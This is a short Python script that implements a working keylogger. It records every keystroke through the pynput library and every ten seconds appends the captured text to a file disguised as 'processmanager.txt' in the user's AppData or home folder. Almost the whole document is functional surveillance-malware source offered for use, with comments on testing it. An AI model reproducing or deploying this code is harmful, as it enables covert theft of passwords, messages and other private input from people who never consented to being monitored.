#!/usr/bin/python3
import pynput.keyboard
import threading
import os 

log = ""
# Cross-platform path handling
if os.name == 'nt':  # Windows
    path = os.environ["appdata"] + "\\processmanager.txt"
else:  # Linux/Mac
    path = os.path.expanduser("~/processmanager.txt")

def process_keys(key):
  # print(key)   ---> you can use it to see the keys in terminal for testing purpose
  global log
  try:
# by this it will print the previous chracter also in the log
    log = log + str(key.char)
  except AttributeError:
    if key == key.space:
      log = log + " "
    elif key == key.right or key == key.left:
      log = log + ""
    elif key == key.up or key == key.down:
      log = log + ""
    else:
        log = log + " " + str(key) + " "    # this is for the keys like enter,shift etc jo character me convert nhi ho skte
  # print(log)  --> for the testing purpose


def report():
  global log
  global path
  fin = open(path,"a")
  fin.write(log)
  log = ""
  fin.close()
  timer = threading.Timer(10,report)    
  timer.start()




#this will help you see the keylooger is working properly or not on your side ..
  # with open("log.txt","a") as fin:
  # 	fin.write(str(key))



def start():
  keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
  with keyboard_listener:
    report()
    keyboard_listener.join()

